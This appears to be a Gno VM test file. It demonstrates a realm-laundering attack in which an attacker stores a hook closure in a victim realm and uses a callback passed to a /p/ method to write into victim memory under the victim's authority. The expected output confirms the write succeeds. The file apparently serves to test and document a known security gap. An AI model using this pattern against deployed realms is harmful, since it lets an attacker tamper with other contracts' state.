// PKGPATH: gno.land/r/launderrh_mv_plainhook_apply
package launderrh_mv_plainhook_apply

// Stored PlainHook (func()) that captures a /p/-typed pointer aliasing
// victim memory and dispatches its /p/-Apply method later, with a
// /p/-declared callback.
//
// Trace:
//   1. main → m.Realm = /r/launderrh_mv_plainhook_apply
//   2. RegisterPlainHook(closure) — Rule 1 → m.Realm = /r/-victim,
//      closure stored.
//   3. RunPlainHooks() — Rule 1 → m.Realm = /r/-victim. Body: h().
//   4. h is /r/-attacker-declared → Rule 1 → m.Realm = /r/-attacker.
//   5. Inside h: captured.Apply(EvilWrite). Apply is a /p/-method on
//      *launderpkg.Immutable; recv is captured *launderpkg.Immutable
//      aliasing victim memory. Rule 2 → m.Realm = /r/-victim.
//   6. EvilWrite top-level /p/ fn → no shift → write commits under
//      victim authority.
//
// Outcome: SUCCEEDS — but this is just the Apply-callback attack
// dressed up as a stored PlainHook. The exploit primitive is the
// same (B): victim invokes /p/-callback under its own authority.
//
// This test isolates the storage variant of the known-open Apply
// laundering — it does NOT add a new exploit primitive, but proves
// that storage doesn't help safety.

import (
	"gno.land/p/demo/tests/launderattack"
	"gno.land/r/tests/vm/launderrvictim"
)

func main(cur realm) {
	launderrvictim.ClearHooks()
	println("before:", launderrvictim.ReadEmbed())

	we := launderrvictim.GetWithEmbed()
	captured := &we.Immutable

	launderrvictim.RegisterPlainHook(func() {
		captured.Apply(launderattack.EvilWrite)
	})
	launderrvictim.RunPlainHooks()

	println("after: ", launderrvictim.ReadEmbed())
}

// Output:
// before: embed-orig
// after:  pwnd-via-apply
